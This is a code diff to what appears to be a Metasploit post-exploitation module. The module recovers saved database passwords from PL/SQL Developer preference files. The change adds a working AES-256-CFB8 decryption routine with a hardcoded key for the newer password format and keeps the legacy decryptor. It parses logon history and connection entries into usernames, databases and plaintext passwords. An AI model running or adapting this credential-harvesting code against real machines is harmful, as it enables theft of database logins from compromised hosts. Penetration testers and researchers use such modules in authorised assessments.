@@ -59,19 +59,36 @@ class MetasploitModule < Msf::Post
     return result
   end
 
+  # New encryption algorithm introduced since PL/SQL Developer 15.0
+  def decrypt_str_aes(str)
+    bytes = Rex::Text.decode_base64(str)
+
+    cipher = OpenSSL::Cipher.new('aes-256-cfb8')
+    cipher.decrypt
+    cipher.key = "\x9C\x1C\xEE\xF3\x8A\x3A\x24\x86\x0C\x3D\x2E\x85\xD2\x9E\x7A\x70\x34\xC1\xD8\x5F\x9C\x1C\xEE\xF3\x8A\x3A\x24\x86\x0C\x3D\x2E\x85"
+    cipher.iv = bytes[0..7] + "\x00" * 8
+
+    return cipher.update(bytes[8..]) + cipher.final
+  end
+
   def decrypt_str(str)
+    # Empty string
     if str == ''
       return ''
     end
 
     if str.match(/^\d{8,}$/) && str.length % 4 == 0
-      return decrypt_str_legacy(str)
+      return decrypt_str_legacy(str) # Legacy encryption
+    elsif str.match(/^X\.[A-Za-z0-9+]+={0,2}$/)
+      return decrypt_str_aes(str[2..]) # New aes encryption
     end
 
-    print_warning('The password encryption algorithm has changed since PL/SQL Developer 15 and this module have not supported it.')
-    return '[Not Supported]'
+    # Shouldn't reach here
+    print_error("Unknown encryption format: #{str}")
+    return '[Unknown]'
   end
 
+  # Parse and separate the history string
   def parse_history(str)
     result = { DisplayName: '', Username: '', Database: '', ConnectAs: '', Password: '', Parent: '-1' }
 
@@ -125,7 +142,7 @@ class MetasploitModule < Msf::Post
     keys = %w[DisplayName Number Parent IsFolder Username Database ConnectAs Password]
     # Initialize obj with empty values
     obj = Hash[keys.map { |k| [k.to_sym, ''] }]
-    # Folders
+    # Folder parent objects
     folders = {}
 
     file_contents.split("\n").each do |line|
@@ -144,10 +161,11 @@ class MetasploitModule < Msf::Post
       end
 
       if logon_history_section
-        # Contents in [LogonHistory] section is plain encrypted strings
+        # Contents in [LogonHistory] section are plain encrypted strings
+        # Calling the legacy decrypt function is intentional here
         result << parse_history(decrypt_str_legacy(line))
       elsif connections_section
-        # Contents in [Connections] section is key-value pairs
+        # Contents in [Connections] section are key-value pairs
         ind = line.index('=')
         if ind.nil?
           print_error("Invalid line: #{line}")
@@ -178,6 +196,7 @@ class MetasploitModule < Msf::Post
       end
     end
 
+    # Build display name (Add parent folder name to the beginning of the display name)
     result.each do |item|
       pitem = item
       while pitem[:Parent] != '-1'
@@ -194,7 +213,7 @@ class MetasploitModule < Msf::Post
       item.delete(:Number)
       item.delete(:IsFolder)
 
-      # Add file path
+      # Add file path to the final result
       item[:FilePath] = file_name
     end
 
